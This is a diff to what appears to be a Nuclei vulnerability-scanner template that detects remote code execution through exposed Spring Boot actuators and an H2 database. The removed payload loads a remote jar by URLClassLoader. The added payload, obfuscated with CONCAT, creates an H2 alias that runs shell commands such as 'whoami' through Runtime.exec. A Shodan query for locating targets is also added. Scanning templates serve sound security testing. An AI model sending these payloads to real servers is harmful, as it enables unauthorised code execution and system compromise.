@@ -4,38 +4,34 @@ info:
   name: Spring Boot H2 Database RCE
   author: dwisiswant0
   severity: critical
-  tags: springboot,rce
-
-  # Payload taken from @pyn3rd (Twitter), see reference[2].
-
-  reference: |
+  tags: springboot,rce,jolokia
+  reference:
     - https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database
     - https://twitter.com/pyn3rd/status/1305151887964946432
     - https://www.veracode.com/blog/research/exploiting-spring-boot-actuators
     - https://github.com/spaceraccoon/spring-boot-actuator-h2-rce
+  metadata:
+    shodan-query: http.favicon.hash:116323821
 
 requests:
-  - method: POST
-    path:
-      - "{{BaseURL}}/actuator/env"
-    headers:
-      Content-Type: "application/json"
-    body: |
-      {
-        "name": "spring.datasource.hikari.connection-init-sql",
-        "value":"CREATE ALIAS remoteUrl AS $$ import java.net.*;@CODE String remoteUrl() throws Exception { Class.forName(\"pop\", true, new URLClassLoader(new URL[]{new URL(\"http://127.0.0.1:9001/pop.jar\")})).newInstance();return null;}$$; CALL remoteUrl()"
-      }
+  - raw:
+      - |
+        POST /actuator/env HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "name":"spring.datasource.hikari.connection-test-query",
+          "value":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('whoami');"
+        }
+
     matchers-condition: and
     matchers:
       - type: status
         status:
           - 200
+
       - type: word
-        words:
-          - "\"spring.datasource.hikari.connection-init-sql\":\""
-        condition: and
         part: body
-      - type: word
         words:
-          - "application/vnd.spring-boot.actuator"
-        part: header
+          - '"spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT'
